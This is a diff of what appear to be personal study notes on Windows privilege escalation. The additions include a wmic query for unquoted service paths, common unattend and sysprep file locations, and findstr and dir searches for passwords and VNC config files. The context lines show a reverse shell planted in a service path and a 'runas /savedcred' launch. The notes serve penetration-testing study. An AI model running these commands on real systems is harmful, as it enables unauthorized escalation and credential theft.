@@ -29,7 +29,7 @@ b- Unquoted Service Path:
 		- .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
 	- Once we have a path where we can write in the unquoted service path, we can copy our reverse shell and rename it as per the unquoted service path.
 	  copy reverse.exe "C:\Program Files\Unquoted Path Service\common.exe"
-
+	- Manual CMD Command: wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 c- Weak registry permissions:
 	- If we can modify the registry entries of a service, we can get a reverse shell by modifying "ImagePath" of any service.
 	- Winpeas will highlight it.
@@ -67,7 +67,19 @@ Passwords:
 	- To confirm we can use: cmdkey /list
 	- runas /savedcred /user:admin C:\PrivEsc\rev.exe
 	- Configuration files(web.config, unattend.xml).
+	- Common Paths:
+	- C:\unattend.xml
+	- C:\sysprep.inf
+	- C:\sysprep\sysprep.xml
+	And you may want to search files using queries like this:
 
+	- dir c:\*vnc.ini /s /b /c
+	- dir c:\*ultravnc.ini /s /b /c
+	- dir c:\ /s /b /c | findstr /si *vnc.ini
+	- findstr /si password *.txt | *.xml | *.ini
+	- findstr /si pass *.txt | *.xml | *.ini
+
+			
 Scheduled Tasks:
 	- cmd command to get scheduled tasks: schtasks /query /fo LIST /v
 	- PS command version: Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft Taskname,TaskPath,State
@@ -98,7 +110,7 @@ Token Impersonation:
   4- If our current user is a service account, then Token Impersonation technique has higher chances to work.
   5- You've got it.
   
-  
+  Useful Link: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
   
   
   
